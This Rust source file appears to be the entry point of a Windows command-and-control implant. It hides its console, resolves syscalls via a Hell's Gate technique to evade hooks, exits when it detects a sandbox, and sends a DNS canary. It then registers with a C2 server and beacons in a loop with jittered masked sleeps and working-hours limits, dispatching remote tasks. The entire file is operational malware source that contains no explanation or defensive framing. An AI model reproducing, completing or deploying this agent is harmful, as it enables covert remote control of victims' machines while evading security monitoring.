#![windows_subsystem = "windows"]

mod config {
    include!(concat!(env!("OUT_DIR"), "/config.rs"));
}
mod crypto;
mod transport;
mod hells_gate;
mod commands;
mod evasion;
mod dotnet;

use std::thread;
use std::time::Duration;
use commands::{DYN_SLEEP_SEC, DYN_JITTER_PCT};

fn sleep_ms() -> u64 {
    use std::sync::atomic::Ordering;
    let base = {
        let s = DYN_SLEEP_SEC.load(Ordering::Relaxed);
        if s == u64::MAX { config::SLEEP_SEC } else { s }
    } * 1000;
    let pct = {
        let j = DYN_JITTER_PCT.load(Ordering::Relaxed);
        if j == u64::MAX { config::JITTER_PCT } else { j }
    };
    if pct == 0 { return base; }
    let jit = (base * pct / 100) as i64;
    let mut r = [0u8; 8];
    crypto::random_bytes(&mut r);
    let delta = (i64::from_le_bytes(r).abs() % (jit * 2 + 1)) - jit;
    (base as i64 + delta).max(1000) as u64
}

fn main() {
    // Resolve Nt* SSNs from ntdll before any evasion or sleep calls.
    hells_gate::init();

    // Evasion: exit silently if running in a sandbox, then fire DNS canary
    evasion::sandbox_check();
    if !config::CANARY_DOMAIN.is_empty() {
        evasion::dns_canary_check(config::CANARY_DOMAIN);
    }

    let mut t = transport::AgentTransport::new();

    // Registration loop — retry every 30 s until success
    loop {
        if t.register() { break; }
        thread::sleep(Duration::from_secs(30));
    }

    // Beacon loop
    loop {
        // Working hours enforcement — sleep 60 s and re-check if outside the window
        if !config::WORKING_HOURS.is_empty() && !evasion::in_working_hours(config::WORKING_HOURS) {
            evasion::sleep_masked(60_000);
            continue;
        }

        let tasks = t.beacon();
        for task in tasks {
            commands::dispatch(&mut t, &task);
        }
        evasion::sleep_masked(sleep_ms());
    }
}
